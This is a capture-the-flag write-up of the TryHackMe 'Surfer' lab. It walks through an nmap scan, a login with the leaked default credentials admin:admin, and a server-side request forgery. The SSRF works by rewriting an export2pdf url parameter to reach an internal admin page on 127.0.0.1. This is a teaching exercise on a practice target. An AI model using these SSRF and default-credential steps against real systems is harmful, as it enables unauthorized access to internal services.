# Surfer from tryhackme

You could do this here https://tryhackme.com/room/surfer

Surfer is a medium rated box which helps us to learn about ssrf or Server-Side Request Forgery

## What the hack is SSRF
Dont be afraid of these terms, I will break it out for you
There will be some internal services running locally that we cannot access like mysql etc...
It is only accessible by localhost

So putting the puzzle pieces together, If we somehow access the loaclhost, eventually we could gain access to those services
Forging the request made by server to go to that internal website.. we could get in

# Writeup
## nmap scan
```
# Nmap 7.92 scan initiated Wed Oct 19 05:21:43 2022 as: nmap -sC -sV -sT -A -oA nmap/surfer 10.10.218.97
Nmap scan report for 10.10.218.97
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a2:46:04:af:7e:ec:d1:d7:bf:83:cd:99:19:8d:46:d1 (RSA)
|   256 65:fe:6f:d3:8b:12:31:57:b3:44:8d:92:b7:e2:61:35 (ECDSA)
|_  256 65:ae:13:88:0b:1e:28:ed:4c:87:fa:9c:28:ba:b6:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/backup/chat.txt
| http-title: 24X7 System+
|_Requested resource was /login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/19%OT=22%CT=1%CU=35715%PV=Y%DS=5%DC=T%G=Y%TM=634FEC
OS:1B%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=F4B3%W2
OS:=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

Right, we can see that the hidden entry in robots.txt. {robots.txt tells the crawlers like google to not to display that}
it is /backup/chat.txt

Going there we can see that 
```

Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```

So let's login with creds admin:admin, as said in chat.txt

After logging in we can see in the right side in recent activity that
```
Internal pages hosted at /internal/admin.php. It contains the system flag.
```
and there is a button for
Export to PDF

Clicking that we can see the server information
```
 Hosting Server Information
Operating System:
Linux
Server IP:
172.17.0.2
Server Hostname:
01a5b58d4be9
Server Protocol:
HTTP/1.1
Server Administrator:
webmaster@localhost
Server Web Port:
80
PHP Version:
7.2.34
CGI Version:
CGI/1.1
System Uptime:
12:53:00 up 9 min, 0 users, load average: 0.00, 0.08, 0.09
```

So intercepting the request in burp suite
we can see that it is making request to http%3A%2F%2F127.0.0.1%2Fserver-info.php { url encoded }
url=http://10.10.96.140/export2pdf.php

let's change url parameter to 

http%3A%2F%2F127.0.0.1%2F/internal/admin.php

and forwarding this we get..
```
Report generated for http://127.0.0.1/internal/admin.php
flag{REDACTED}
```



















































